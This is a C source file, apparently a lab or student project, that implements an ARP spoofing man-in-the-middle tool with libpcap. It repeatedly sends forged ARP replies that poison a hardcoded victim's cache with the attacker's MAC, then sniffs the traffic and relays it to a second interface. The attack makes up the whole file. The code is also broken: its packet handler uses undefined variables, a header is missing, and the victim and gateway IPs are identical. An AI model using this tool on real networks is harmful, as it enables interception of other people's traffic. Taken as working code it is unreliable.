#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <pthread.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <pcap.h>
#include <linux/if_ether.h>
//#include <linux/if_arp.h>

#define GATEWAY_IP "192.168.230.139"
#define VICTIM_IP "192.168.230.139"

struct arphdr {
	__be16		ar_hrd;		/* format of hardware address	*/
	__be16		ar_pro;		/* format of protocol address	*/
	unsigned char	ar_hln;		/* length of hardware address	*/
	unsigned char	ar_pln;		/* length of protocol address	*/
	__be16		ar_op;		/* ARP opcode (command)		*/

#if 1
	 /*
	  *	 Ethernet looks like this : This bit is variable sized however...
	  */
	unsigned char		ar_sha[ETH_ALEN];	/* sender hardware address	*/
	unsigned char		ar_sip[4];		/* sender IP address		*/
	unsigned char		ar_tha[ETH_ALEN];	/* target hardware address	*/
	unsigned char		ar_tip[4];		/* target IP address		*/
#endif

};

//arp
void* arp_thread(void *args) //스레드 함수
{
//	ADDR_PAKAGE *addr_pak = (ADDR_PAKAGE*)args;
	//스레드가 수행할 함수 ARP Spoofing
	uint8_t packet[42];
	int i;

	struct ethhdr* eth_ptr = (struct ethhdr*)packet;
	struct arphdr* arp_ptr = (struct arphdr*)(packet + sizeof(*eth_ptr));


	uint8_t victim_mac[ETH_ALEN] = {0x00, 0x0c, 0x29, 0x4c, 0x00, 0x4f};
	uint8_t proxy_mac[ETH_ALEN] = {0x00, 0x0c, 0x29, 0xab, 0x96, 0x08};

	unsigned int*temp;
	pcap_t* handle=(pcap_t*)args;


	for (i = 0; i < ETH_ALEN; i++)
		eth_ptr->h_dest[i] = victim_mac[i];

	for (i = 0; i < ETH_ALEN;i++)
		eth_ptr->h_source[i] = proxy_mac[i];

	eth_ptr->h_proto = htons(ETH_P_ARP); //0806
	#define HW_ETHER 0x0001
	#define PROTO_IPV4 0x0800
	#define OP_REPLY 0x0002
	arp_ptr->ar_hrd = htons(HW_ETHER); //0001
	arp_ptr->ar_pro = htons(PROTO_IPV4); //0800
	arp_ptr->ar_hln = ETH_ALEN;
	arp_ptr->ar_pln = 4; //IPv4_LEN
	arp_ptr->ar_op = htons(OP_REPLY); //0002

	for (i = 0; i < ETH_ALEN; i++)
		arp_ptr->ar_sha[i] = proxy_mac[i];
	temp=(uint*)arp_ptr->ar_sip;
	*temp=inet_addr(GATEWAY_IP);

	printf("arp : %s %x\n", GATEWAY_IP, htonl(*temp));

	for (i = 0; i < ETH_ALEN; i++)
		arp_ptr->ar_tha[i] = victim_mac[i];
	temp=(uint*)arp_ptr->ar_tip;
	*temp=inet_addr(VICTIM_IP);

	while (1)
	{
		printf("ARP Spoofing...\n");
		if(pcap_sendpacket(handle, (const u_char *)packet, 42)==-1)
			perror("ARP Spoof");
		sleep(2);
	}
	return NULL;
}

void packet_handling(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer)
{
	pcap_t* r_handle = (pcap_t*)args;

    /* Send down the packet */
    if (pcap_sendpacket(r_handle, packet, 100 /* size */) != 0)
    {
        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(fp));
        return;
    }
};


int main()
{

	pcap_if_t *alldevsp , *device;
	pcap_t *handle, *r_handle;
	
	char errbuf[100] , *devname , devs[100][100];
	int count = 1 , n;

	pthread_t thread;
	int iret;

	//First get the list of available devices
	printf("Finding available devices ... ");
	if(pcap_findalldevs( &alldevsp , errbuf))
	{
		printf("Error finding devices : %s\n" , errbuf);
		exit(1);
	}
	if(alldevsp == NULL)
	{
		printf("*** devices are not exist. ***\n");
		exit(1);
	}
	printf("Done\n");
	
	//Print the available devices
	printf("\nAvailable Devices are :\n");
	for(device = alldevsp ; device != NULL ; device = device->next)
	{
		printf("%d. %s" , count , device->name);
		if(device->description != NULL)
			printf(" - %s", device->description);
		printf("\n");
		if(device->name != NULL)
		{
			strcpy(devs[count] , device->name);
		}
		count++;
	}
	
	//			sub network NIC
	printf("\nEnter the number of the device you want to sniff : ");
	scanf("%d" , &n);
	devname = devs[n];
	
	//Open the device for sniffing
	printf("Opening device %s for sniffing ... " , devname);
	handle = pcap_open_live(devname , 65536 , 1 , 0 , errbuf);
	
	if (handle == NULL) 
	{
		fprintf(stderr, "Couldn't open device %s : %s\n" , devname , errbuf);
		exit(1);
	}
	printf("Done\n");

	//			relay NIC
	printf("Enter the number of the localhost device  : ");
	scanf("%d" , &n);
	devname = devs[n];
	
	//Open the device for sniffing
	printf("Opening device %s for sniffing ... " , devname);
	r_handle = pcap_open_live(devname , 65536 , 1 , 0 , errbuf);
	
	if (r_handle == NULL) 
	{
		fprintf(stderr, "Couldn't open device %s : %s\n" , devname , errbuf);
		exit(1);
	}
	printf("Done\n");

	//ARP Thread
	iret = pthread_create( &thread, NULL, arp_thread, (void*)handle);
	if(iret)
	     perror("pthread_create");
	
	//Put the device in sniff loop
	pcap_loop(handle , -1 , packet_handling , (u_char*)r_handle);

	return 0;
}